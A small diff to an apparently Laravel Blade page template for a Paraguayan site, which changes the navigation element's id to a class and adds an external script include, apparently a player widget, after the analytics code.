@@ -41,7 +41,7 @@
                                             <span>Del Paraguay</span>
                                         </div>
                                     
-                                        <nav id="nav">
+                                        <nav class="nav">
                                             <ul>
                                             @foreach($menu as $link => $item)
                                                 <li class="{{ $item[1] ? 'current_page_item': ''}}"><a href="{{$link}}">{{$item[0]}}</a></li>
@@ -153,6 +153,7 @@
     ga('send', 'pageview');
 
     </script>
+        <script src="http://www.cardinal.com.py/play/23326"></script>
 
     </body>
 </html>
